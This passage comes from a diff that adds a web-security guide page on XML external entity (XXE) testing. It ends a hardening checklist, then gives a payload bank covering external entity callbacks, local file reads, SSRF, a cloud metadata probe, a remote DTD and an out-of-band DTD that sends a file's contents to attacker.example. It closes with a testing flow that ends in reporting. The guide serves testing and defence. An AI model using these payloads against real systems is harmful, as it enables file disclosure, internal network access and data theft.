+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> External parameter entities disabled.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> External DTD loading disabled.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> XInclude disabled unless required.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Safe resolver configured.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Parser-specific settings applied to all XML paths.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> XML workers isolated.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Egress restricted.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> File size and parse limits enforced.</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Raw parser errors hidden from users.</li>
+</ul>
+<hr />
+<h2 id="quick-payload-bank">Quick Payload Bank</h2>
+<p>Internal entity marker:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a><span class="cp">  &lt;!ENTITY marker &quot;xxe-test-73921&quot;&gt;</span>
+</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#__codelineno-96-4"></a>]&gt;
+</span><span id="__span-96-5"><a id="__codelineno-96-5" name="__codelineno-96-5" href="#__codelineno-96-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;marker;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>External callback:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-97-3"><a id="__codelineno-97-3" name="__codelineno-97-3" href="#__codelineno-97-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example/&quot;&gt;</span>
+</span><span id="__span-97-4"><a id="__codelineno-97-4" name="__codelineno-97-4" href="#__codelineno-97-4"></a>]&gt;
+</span><span id="__span-97-5"><a id="__codelineno-97-5" name="__codelineno-97-5" href="#__codelineno-97-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Parameter entity callback:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-98-2"><a id="__codelineno-98-2" name="__codelineno-98-2" href="#__codelineno-98-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-98-3"><a id="__codelineno-98-3" name="__codelineno-98-3" href="#__codelineno-98-3"></a><span class="cp">  &lt;!ENTITY % xxe SYSTEM &quot;http://xxe-test-73921.oast.example/param&quot;&gt;</span>
+</span><span id="__span-98-4"><a id="__codelineno-98-4" name="__codelineno-98-4" href="#__codelineno-98-4"></a><span class="w">  </span>%xxe;
+</span><span id="__span-98-5"><a id="__codelineno-98-5" name="__codelineno-98-5" href="#__codelineno-98-5"></a>]&gt;
+</span><span id="__span-98-6"><a id="__codelineno-98-6" name="__codelineno-98-6" href="#__codelineno-98-6"></a><span class="nt">&lt;root&gt;</span>test<span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Linux file read:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt;</span>
+</span><span id="__span-99-4"><a id="__codelineno-99-4" name="__codelineno-99-4" href="#__codelineno-99-4"></a>]&gt;
+</span><span id="__span-99-5"><a id="__codelineno-99-5" name="__codelineno-99-5" href="#__codelineno-99-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Windows file read:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;</span>
+</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a>]&gt;
+</span><span id="__span-100-5"><a id="__codelineno-100-5" name="__codelineno-100-5" href="#__codelineno-100-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>SSRF:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080/health&quot;&gt;</span>
+</span><span id="__span-101-4"><a id="__codelineno-101-4" name="__codelineno-101-4" href="#__codelineno-101-4"></a>]&gt;
+</span><span id="__span-101-5"><a id="__codelineno-101-5" name="__codelineno-101-5" href="#__codelineno-101-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Cloud metadata minimal probe:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#__codelineno-102-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#__codelineno-102-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/&quot;&gt;</span>
+</span><span id="__span-102-4"><a id="__codelineno-102-4" name="__codelineno-102-4" href="#__codelineno-102-4"></a>]&gt;
+</span><span id="__span-102-5"><a id="__codelineno-102-5" name="__codelineno-102-5" href="#__codelineno-102-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>External DTD loader:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a><span class="cp">  &lt;!ENTITY % remote SYSTEM &quot;http://attacker.example/xxe.dtd&quot;&gt;</span>
+</span><span id="__span-103-4"><a id="__codelineno-103-4" name="__codelineno-103-4" href="#__codelineno-103-4"></a><span class="w">  </span>%remote;
+</span><span id="__span-103-5"><a id="__codelineno-103-5" name="__codelineno-103-5" href="#__codelineno-103-5"></a>]&gt;
+</span><span id="__span-103-6"><a id="__codelineno-103-6" name="__codelineno-103-6" href="#__codelineno-103-6"></a><span class="nt">&lt;root&gt;</span>test<span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Harmless external DTD:</p>
+<div class="language-dtd highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">callback</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;http://xxe-test-73921.oast.example/dtd-loaded&quot;</span><span class="k">&gt;</span>
+</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a><span class="ni">%callback;</span>
+</span></code></pre></div>
+<p>OOB file-read concept with harmless file:</p>
+<div class="language-dtd highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">file</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;file:///etc/hostname&quot;</span><span class="k">&gt;</span>
+</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">eval</span> <span class="s2">&quot;&lt;!ENTITY % exfil SYSTEM &#39;http://attacker.example/?x=%file;&#39;&gt;&quot;</span><span class="k">&gt;</span>
+</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a><span class="ni">%eval;</span>
+</span><span id="__span-105-4"><a id="__codelineno-105-4" name="__codelineno-105-4" href="#__codelineno-105-4"></a><span class="ni">%exfil;</span>
+</span></code></pre></div>
+<p>XInclude:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="nt">&lt;root</span><span class="w"> </span><span class="na">xmlns:xi=</span><span class="s">&quot;http://www.w3.org/2001/XInclude&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a><span class="w">  </span><span class="nt">&lt;xi:include</span><span class="w"> </span><span class="na">parse=</span><span class="s">&quot;text&quot;</span><span class="w"> </span><span class="na">href=</span><span class="s">&quot;file:///etc/hostname&quot;</span><span class="nt">/&gt;</span>
+</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>SVG callback:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span>
+</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a><span class="cp">&lt;!DOCTYPE svg [</span>
+</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;http://xxe-test-73921.oast.example/svg&quot;&gt;</span>
+</span><span id="__span-107-4"><a id="__codelineno-107-4" name="__codelineno-107-4" href="#__codelineno-107-4"></a>]&gt;
+</span><span id="__span-107-5"><a id="__codelineno-107-5" name="__codelineno-107-5" href="#__codelineno-107-5"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;100&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;100&quot;</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-107-6"><a id="__codelineno-107-6" name="__codelineno-107-6" href="#__codelineno-107-6"></a><span class="w">  </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;20&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
+</span><span id="__span-107-7"><a id="__codelineno-107-7" name="__codelineno-107-7" href="#__codelineno-107-7"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<p>PHP base64 wrapper:</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a><span class="cp">&lt;!DOCTYPE root [</span>
+</span><span id="__span-108-3"><a id="__codelineno-108-3" name="__codelineno-108-3" href="#__codelineno-108-3"></a><span class="cp">  &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/hostname&quot;&gt;</span>
+</span><span id="__span-108-4"><a id="__codelineno-108-4" name="__codelineno-108-4" href="#__codelineno-108-4"></a>]&gt;
+</span><span id="__span-108-5"><a id="__codelineno-108-5" name="__codelineno-108-5" href="#__codelineno-108-5"></a><span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
+</span></code></pre></div>
+<p>Content-Type values:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>application/xml
+</span><span id="__span-109-2"><a id="__codelineno-109-2" name="__codelineno-109-2" href="#__codelineno-109-2"></a>text/xml
+</span><span id="__span-109-3"><a id="__codelineno-109-3" name="__codelineno-109-3" href="#__codelineno-109-3"></a>application/soap+xml
+</span><span id="__span-109-4"><a id="__codelineno-109-4" name="__codelineno-109-4" href="#__codelineno-109-4"></a>application/xhtml+xml
+</span><span id="__span-109-5"><a id="__codelineno-109-5" name="__codelineno-109-5" href="#__codelineno-109-5"></a>image/svg+xml
+</span></code></pre></div>
+<hr />
+<h2 id="practical-summary">Practical Summary</h2>
+<p>XXE is about abusing dangerous XML features, especially DTDs and external entities.</p>
+<p>The practical testing flow is:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>Find XML parser
+</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>→ test harmless entity expansion
+</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a>→ test external callback
+</span><span id="__span-110-4"><a id="__codelineno-110-4" name="__codelineno-110-4" href="#__codelineno-110-4"></a>→ test parameter entities
+</span><span id="__span-110-5"><a id="__codelineno-110-5" name="__codelineno-110-5" href="#__codelineno-110-5"></a>→ test safe local file read
+</span><span id="__span-110-6"><a id="__codelineno-110-6" name="__codelineno-110-6" href="#__codelineno-110-6"></a>→ test blind/OOB behavior if needed
+</span><span id="__span-110-7"><a id="__codelineno-110-7" name="__codelineno-110-7" href="#__codelineno-110-7"></a>→ test XML-based uploads and second-order parsers
+</span><span id="__span-110-8"><a id="__codelineno-110-8" name="__codelineno-110-8" href="#__codelineno-110-8"></a>→ prove minimal safe impact
+</span><span id="__span-110-9"><a id="__codelineno-110-9" name="__codelineno-110-9" href="#__codelineno-110-9"></a>→ report with parser-specific remediation
+</span></code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../Command_Injection/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Command Injection">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Command Injection
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../Cypher_Injection/" class="md-footer__link md-footer__link--next" aria-label="Next: Cypher Injection">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Cypher Injection
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "toc.integrate", "toc.follow", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/runaway-bat.js"></script>
+      
+        <script src="../../javascripts/sidebar-follow-active.js"></script>
+      
+        <script src="../../javascripts/page-up.js"></script>
+      
+        <script src="../../javascripts/checklist-state.js"></script>
+      
+    
+  </body>
+</html>
